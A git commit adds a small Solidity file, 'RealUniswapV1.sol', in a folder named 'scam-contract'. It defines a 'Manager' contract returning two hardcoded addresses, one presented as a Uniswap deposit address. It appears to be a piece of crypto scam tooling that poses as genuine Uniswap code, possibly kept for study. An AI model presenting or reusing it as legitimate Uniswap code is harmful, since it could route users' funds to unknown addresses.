16fc0d1bb3c25c3c17aaed42424307367bd1ad8c
Syaifullah <syaifullah.b.pallu@gmail.com>
2023-06-15 05:40:56 +0800

    First Commit

---
+++ Solidity/scam-contract/RealUniswapV1.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	
+    function uniswapDepositAddress() public pure returns (address) {
+		return 0x3A18237bF018A0A5bC663D4Ec2cb0ea160f76fA4;
+		}
+    
+    function uniswapAddressthis() public pure returns (address) {
+		return 0xb29Fb797947f6897427A24BD65323F4b69C85DE1;
+        }
+
+}
